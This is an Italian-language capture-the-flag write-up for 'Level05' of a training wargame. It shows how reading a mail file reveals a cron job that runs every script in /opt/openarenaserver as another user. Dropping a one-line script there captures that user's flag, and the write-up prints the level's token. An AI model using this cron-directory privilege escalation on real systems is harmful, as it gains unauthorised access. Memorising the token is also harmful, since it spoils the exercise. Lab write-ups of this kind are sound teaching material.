# Level05
### 1 passaggio:
Al login arriva una notifica che abbiamo ricevuto un'email dunque con il comando
`cat /var/mail/level05` possiamo vedere il contenuto:
```bash
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
Abbiamo davanti un comando per cron, purtroppo non avendo i permessi di root non possiamo
vedere tutti i cron per ogni utente ma possiamo leggere lo script openarenaserver che contiene il
seguente script:
```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

Esegue ogni script all'interno della cartella `/opt/openarenaserver/` e poi lo elimina, in effetti
creando un file all'interno di quella cartella dopo un po viene eliminato dunque abbiamo 
la certezza che il cron è attivo.

### 2 passaggio:
Con il comando:
```bash
echo "getflag > /tmp/flag" > /opt/openarenaserver/exploit ; chmod +x /opt/openarenaserver/exploit
```
facciamo eseguire al cron con i permessi giusti il comando getflag e l'output lo reindirizziamo nel file
`/tmp/flag` così dopo qualche minuto abbiamo il seguente output:
```bash
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
